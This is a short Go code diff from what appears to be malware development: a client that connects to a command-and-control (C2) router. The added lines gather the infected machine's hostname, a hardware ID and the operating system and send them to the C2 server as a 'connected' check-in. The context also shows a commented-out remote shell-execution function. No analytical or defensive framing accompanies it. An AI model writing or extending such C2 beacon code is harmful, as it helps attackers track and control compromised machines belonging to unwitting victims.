@@ -65,6 +65,16 @@ func connectToC2Router() {
 
 	go client.readPump()
 	go client.writePump()
+
+	// send connected message to c2
+	deviceHostname, err := os.Hostname()
+	if err != nil {
+		log.Println("err getting hostname:", err)
+	}
+
+	connectedAlertMsg := fmt.Sprintf("%s [`%s`] OS: `%s` connected", deviceHostname, machineHWID, runtime.GOOS)
+	connectedTransferPacket := encodeTransferPacket("connected", connectedAlertMsg)
+	client.send <- connectedTransferPacket
 }
 
 //func Shellout(command string) (string, string, error) {
